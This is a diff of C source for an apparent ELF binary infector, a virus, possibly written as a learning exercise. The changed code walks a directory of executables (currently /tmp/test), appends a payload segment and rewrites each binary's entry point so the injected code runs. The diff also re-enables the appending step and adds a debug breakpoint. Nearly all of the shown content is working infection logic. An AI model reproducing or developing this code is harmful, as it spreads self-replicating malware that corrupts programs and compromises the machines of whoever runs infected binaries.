@@ -23,7 +23,26 @@ struct  linux_dirent {
 };
 
 static void  end(void);
-int   entry_point(void);
+static int  infectBins(const char *dirname);
+
+// TODO Payload must be aligned on 16
+int   entry_point(void) {
+  asm("int3");
+  /* size_t  i; */
+  // TODO Array of string
+  char    infectDir[] = "/tmp/test";
+
+/*   i = 0; */
+  if (infectBins(infectDir) == -1)
+    return (1);
+  /* while (infectDir[i] != NULL) { */
+  /*   if (infectBins(infectDir[0]) == -1) */
+  /*     return (1); */
+  /*   i += 1; */
+  /* } */
+  return (0);
+}
+
 
 static int  write(int fd, const void *buf, size_t count) {
   register int8_t     rax asm("rax") = 1;
@@ -320,7 +339,7 @@ static int  appendCode(struct bfile *bin) {
   segment->p_paddr = bin->size - size;
   segment->p_filesz = size;
   segment->p_memsz = size;
-  bin->header->e_entry = 0xc000000 + bin->size - ((void *)end - (void *)entry_point);
+  bin->header->e_entry = 0xc000000 + bin->size - size;
   return (0);
   
 }
@@ -351,8 +370,8 @@ static int  infectFile(struct bfile bin) {
   }
   data->sh_size += strlen(payload) + 1;
   bin.size += len + 1;
-  /* if (appendCode(&bin) == -1) */
-  /*   return (-1); */
+  if (appendCode(&bin) == -1)
+    return (-1);
   write(bin.fd, bin.header, bin.size);
   close(bin.fd);
   munmap(bin.header, bin.size);
@@ -394,23 +413,6 @@ static int  infectBins(const char *dirname) {
     bpos += dirp->d_reclen;
   }
   close(fd);
-  return (0);
-}
-
-// TODO Payload must be aligned on 16
-int   entry_point(void) {
-  /* size_t  i; */
-  // TODO Array of string
-  char    infectDir[] = "/tmp/test";
-
-/*   i = 0; */
-  if (infectBins(infectDir) == -1)
-    return (1);
-  /* while (infectDir[i] != NULL) { */
-  /*   if (infectBins(infectDir[0]) == -1) */
-  /*     return (1); */
-  /*   i += 1; */
-  /* } */
   return (0);
 }
 
